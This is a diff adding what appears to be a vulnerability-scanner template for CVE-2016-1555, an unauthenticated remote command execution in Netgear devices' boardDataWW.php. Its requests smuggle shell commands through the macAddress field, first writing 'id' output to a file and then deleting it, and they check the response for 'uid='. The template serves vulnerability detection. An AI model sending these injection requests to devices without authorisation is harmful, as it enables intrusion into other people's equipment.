@@ -1,0 +1,51 @@
+id: netgear-boarddata-remote-command-exec
+info:
+  name: Netgear Devices boardDataWW.php Unauthenticated Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    boardDataWW.php in Netgear WN604 and other devices allows remote attackers to execute arbitrary commands.
+  reference:
+    - https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE
+  classification:
+    cve-id: CVE-2016-1555
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        POST /boardDataWW.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        macAddress=112233445566%3Bid+%3E+.%2Foutput+%23&reginfo=0&writeData=Submit
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /output HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid="
+  - raw:
+      - |
+        POST /boardDataWW.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        macAddress=112233445566%3Brm+.%2Foutput+%23&reginfo=0&writeData=Submit
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
